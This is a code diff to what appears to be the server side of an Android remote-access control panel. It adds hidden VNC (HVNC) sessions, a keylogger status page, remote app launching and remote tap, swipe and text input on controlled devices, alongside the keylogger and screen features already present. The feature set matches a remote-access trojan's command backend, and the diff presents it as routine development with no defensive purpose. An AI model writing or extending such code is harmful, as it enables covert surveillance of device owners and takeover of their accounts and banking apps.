@@ -37,6 +37,7 @@ const PAGE_PERMISSIONS: Record<string, Permission> = {
   fason: 'device:fason',
   screen: 'device:screen',
   keylogger: 'device:keylogger',
+  keylogger_status: 'device:keylogger',
   downloads: 'files:download',
 };
 
@@ -72,11 +73,15 @@ function validateRealtimeCommand(cmd: CmdType, params: Record<string, unknown>):
   const action = typeof params.action === 'string' ? params.action : '';
   const needsSession = cmd === CMD.WEBRTC_OFFER
     || cmd === CMD.WEBRTC_ICE
-    || (cmd === CMD.SCREEN && ['start', 'detach'].includes(action));
+    || cmd === CMD.HVNC_OFFER
+    || cmd === CMD.HVNC_ICE
+    || (cmd === CMD.SCREEN && ['start', 'detach'].includes(action))
+    || (cmd === CMD.HVNC && ['start', 'detach', 'launchApp', 'resize'].includes(action))
+    || (cmd === CMD.HVNC_CTRL && action !== 'status');
   if (needsSession && (typeof params.sessionId !== 'string' || !SESSION_ID_PATTERN.test(params.sessionId))) {
     return 'Invalid WebRTC session ID';
   }
-  if (cmd === CMD.WEBRTC_OFFER) {
+  if (cmd === CMD.WEBRTC_OFFER || cmd === CMD.HVNC_OFFER) {
     if (typeof params.sdp !== 'string' || params.sdp.length === 0 || params.sdp.length > 2_000_000) {
       return 'Invalid WebRTC offer';
     }
@@ -84,35 +89,51 @@ function validateRealtimeCommand(cmd: CmdType, params: Record<string, unknown>):
       return 'Invalid ICE server configuration';
     }
   }
-  if (cmd === CMD.WEBRTC_ICE) {
+  if (cmd === CMD.WEBRTC_ICE || cmd === CMD.HVNC_ICE) {
     if (typeof params.candidate !== 'string' || params.candidate.length === 0 || params.candidate.length > 16_384) {
       return 'Invalid ICE candidate';
     }
   }
-  if (cmd === CMD.SCREEN_CTRL) {
-    if (!(Object.values(SCREEN_ACTION) as string[]).includes(action)) return 'Invalid remote-control action';
-    const touchActions: string[] = [SCREEN_ACTION.TAP, SCREEN_ACTION.TOUCH_START, SCREEN_ACTION.TOUCH_MOVE, SCREEN_ACTION.TOUCH_END];
+  if (cmd === CMD.HVNC) {
+    if (action === 'start' || action === 'resize') {
+      if (params.virtualWidth !== undefined && (!isFiniteNumber(params.virtualWidth) || (params.virtualWidth as number) < 240 || (params.virtualWidth as number) > 1920)) {
+        return 'Invalid virtual display width';
+      }
+      if (params.virtualHeight !== undefined && (!isFiniteNumber(params.virtualHeight) || (params.virtualHeight as number) < 320 || (params.virtualHeight as number) > 3840)) {
+        return 'Invalid virtual display height';
+      }
+    }
+    if (action === 'launchApp' && (typeof params.packageName !== 'string' || params.packageName.length === 0 || params.packageName.length > 255)) {
+      return 'Invalid package name';
+    }
+  }
+  if (cmd === CMD.SCREEN_CTRL || cmd === CMD.HVNC_CTRL) {
+    const validActions = cmd === CMD.HVNC_CTRL
+      ? ['tap', 'swipe', 'gesture', 'key', 'text', 'volume', 'touchStart', 'touchMove', 'touchEnd', 'status']
+      : Object.values(SCREEN_ACTION) as string[];
+    if (action && !validActions.includes(action)) return 'Invalid remote-control action';
+    const touchActions: string[] = [SCREEN_ACTION.TAP, SCREEN_ACTION.TOUCH_START, SCREEN_ACTION.TOUCH_MOVE, SCREEN_ACTION.TOUCH_END, 'touchStart', 'touchMove', 'touchEnd'];
     if (touchActions.includes(action)
       && (!isFiniteNumber(params.x) || !isFiniteNumber(params.y))) {
       return 'Invalid touch coordinates';
     }
-    if (action === SCREEN_ACTION.SWIPE &&
+    if ((action === SCREEN_ACTION.SWIPE || action === 'swipe') &&
       (![params.startX, params.startY, params.endX, params.endY].every(isFiniteNumber))) {
       return 'Invalid swipe coordinates';
     }
-    if (action === SCREEN_ACTION.GESTURE && (!Array.isArray(params.points) || params.points.length === 0 || params.points.length > 256
+    if ((action === SCREEN_ACTION.GESTURE || action === 'gesture') && (!Array.isArray(params.points) || params.points.length === 0 || params.points.length > 256
       || params.points.some((point) => !point || typeof point !== 'object'
         || !isFiniteNumber((point as Record<string, unknown>).x)
         || !isFiniteNumber((point as Record<string, unknown>).y)))) {
       return 'Invalid remote gesture';
     }
-    if (action === SCREEN_ACTION.KEY && !['back', 'home', 'recents'].includes(String(params.keyCode).toLowerCase())) {
+    if ((action === SCREEN_ACTION.KEY || action === 'key') && !['back', 'home', 'recents'].includes(String(params.keyCode).toLowerCase())) {
       return 'Invalid navigation key';
     }
-    if (action === SCREEN_ACTION.VOLUME && !['up', 'down', 'mute'].includes(String(params.direction).toLowerCase())) {
+    if ((action === SCREEN_ACTION.VOLUME || action === 'volume') && !['up', 'down', 'mute'].includes(String(params.direction).toLowerCase())) {
       return 'Invalid volume direction';
     }
-    if (action === SCREEN_ACTION.TEXT && (typeof params.text !== 'string' || params.text.length > 10_000)) {
+    if ((action === SCREEN_ACTION.TEXT || action === 'text') && (typeof params.text !== 'string' || params.text.length > 10_000)) {
       return 'Invalid remote text input';
     }
   }
@@ -186,7 +207,13 @@ export async function deviceRoutes(app: FastifyInstance) {
   });
 
   app.get('/api/client/:id/webrtc-config', {
-    preHandler: [app.auth, requirePermission('device:screen')],
+    preHandler: [app.auth, async (request: any, reply: any) => {
+      const user = request.user;
+      if (user?.role === 'admin' || user?.permissions?.includes('device:screen') || user?.permissions?.includes('device:hvnc')) {
+        return;
+      }
+      return reply.code(403).send({ success: false, error: 'Insufficient permissions' });
+    }],
   }, async (request, reply) => {
     const { id } = request.params as { id: string };
     const d = getDb();
@@ -336,7 +363,7 @@ export async function deviceRoutes(app: FastifyInstance) {
       return reply.code(400).send({ success: false, error: 'Invalid command' });
     }
 
-    const screenCommands: CmdType[] = [CMD.SCREEN, CMD.SCREEN_CTRL, CMD.WEBRTC_OFFER, CMD.WEBRTC_ICE];
+    const screenCommands: CmdType[] = [CMD.SCREEN, CMD.SCREEN_CTRL, CMD.WEBRTC_OFFER, CMD.WEBRTC_ICE, CMD.HVNC, CMD.HVNC_CTRL, CMD.HVNC_OFFER, CMD.HVNC_ANSWER, CMD.HVNC_ICE];
     const user = getRequestUser(request);
     const requiredPermission: Permission = screenCommands.includes(cmdType) ? 'device:screen' : 'device:command';
     if (!user.permissions?.includes(requiredPermission)) {
@@ -452,6 +479,10 @@ function getPageData(id: string, page: string, client: any) {
     case 'keylogger': {
       const raw = safeJsonParse(dbHelpers.getOrCreateClientData(id, 'keylogger'));
       return { list: Array.isArray(raw) ? raw : [] };
+    }
+    case 'keylogger_status': {
+      const raw = safeJsonParse(dbHelpers.getOrCreateClientData(id, 'keylogger_status'));
+      return raw || { enabled: null, queued: 0, checkedAt: null };
     }
     case 'screen':
       return {};  // WebRTC media and real-time screen state are not stored in DB.
